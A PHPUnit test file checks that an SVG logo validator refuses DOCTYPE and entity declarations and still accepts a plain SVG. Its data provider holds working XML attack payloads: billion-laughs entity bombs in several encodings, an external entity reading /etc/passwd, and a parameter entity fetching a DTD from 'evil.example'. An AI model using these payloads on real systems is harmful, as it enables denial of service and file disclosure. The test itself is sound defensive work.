<?php

// Copyright (c) 2026 Unisolva for Information Technology and App Development L.L.C. All rights reserved. See LICENSE.

namespace Tests\Unit;

use App\Support\LogoValidator;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

/**
 * An SVG logo may not carry a DOCTYPE or entity declarations in any form,
 * including entity-expansion bombs and encodings that hide the markup from a
 * plain byte search.
 */
class LogoValidatorEntityTest extends TestCase
{
    private static function billionLaughs(string $doctypeKeyword = '!DOCTYPE'): string
    {
        $entities = '<!ENTITY lol "lol">';
        for ($i = 1; $i <= 9; $i++) {
            $previous = $i === 1 ? 'lol' : 'lol'.($i - 1);
            $entities .= '<!ENTITY lol'.$i.' "'.str_repeat('&'.$previous.';', 10).'">';
        }

        return '<?xml version="1.0"?><'.$doctypeKeyword.' svg ['.$entities.']>'
            .'<svg xmlns="http://www.w3.org/2000/svg"><text>&lol9;</text></svg>';
    }

    /**
     * @return array<string, array{string}>
     */
    public static function entityPayloads(): array
    {
        $bomb = self::billionLaughs();

        return [
            'billion laughs' => [$bomb],
            'billion laughs, lower-case doctype' => [self::billionLaughs('!doctype')],
            'billion laughs, UTF-16LE with BOM' => ["\xFF\xFE".mb_convert_encoding(str_replace('<?xml version="1.0"?>', '<?xml version="1.0" encoding="UTF-16"?>', $bomb), 'UTF-16LE', 'UTF-8')],
            'billion laughs, UTF-16BE without BOM' => [mb_convert_encoding(str_replace('<?xml version="1.0"?>', '<?xml version="1.0" encoding="UTF-16BE"?>', $bomb), 'UTF-16BE', 'UTF-8')],
            'doctype hidden by a UTF-7 declaration' => ['<?xml version="1.0" encoding="UTF-7"?>+ADw-!DOCTYPE svg +AFs-+ADw-!ENTITY a +ACI-x+ACI-+AD4-+AF0-+AD4-<svg xmlns="http://www.w3.org/2000/svg"><text>+ACY-a+ADs-</text></svg>'],
            'internal entity, no bomb' => ['<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "x">]><svg xmlns="http://www.w3.org/2000/svg"><text>&a;</text></svg>'],
            'external entity' => ['<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg">&x;</svg>'],
            'parameter entity' => ['<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY % p SYSTEM "http://evil.example/p.dtd"> %p;]><svg xmlns="http://www.w3.org/2000/svg"/>'],
            'public DTD reference' => ['<?xml version="1.0"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg xmlns="http://www.w3.org/2000/svg"/>'],
        ];
    }

    #[DataProvider('entityPayloads')]
    public function test_any_doctype_or_entity_is_refused_quickly(string $svg): void
    {
        $started = microtime(true);
        $result = LogoValidator::check($svg);

        $this->assertIsString($result, 'The payload was accepted.');
        // Refused for the right reason, not because parsing happened to fail.
        $this->assertContains($result, [LogoValidator::DOCTYPE_ERROR, LogoValidator::ENCODING_ERROR]);
        $this->assertLessThan(1.0, microtime(true) - $started, 'Refusing took too long; was the payload expanded?');
    }

    public function test_a_plain_utf8_svg_is_still_accepted(): void
    {
        $svg = '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 4 4"><rect width="4" height="4" fill="#063"/></svg>';

        $this->assertSame(['mime' => 'image/svg+xml'], LogoValidator::check($svg));
    }
}
